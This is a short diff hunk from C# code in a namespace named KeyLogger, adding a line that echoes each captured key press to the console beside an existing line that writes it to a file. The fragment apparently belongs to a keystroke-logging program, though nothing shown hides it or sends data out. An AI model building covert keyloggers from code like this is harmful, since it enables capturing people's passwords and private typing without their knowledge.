@@ -18,6 +18,7 @@ namespace KeyLogger
                 {
                     var message = $"Pressed {keyEvent.Key}";
                     fileWriter.WriteLine(message);
+                    Console.WriteLine(message);
                 },
                 ex => Console.WriteLine($"Error: {ex.Message}"),
                 () => completed = true
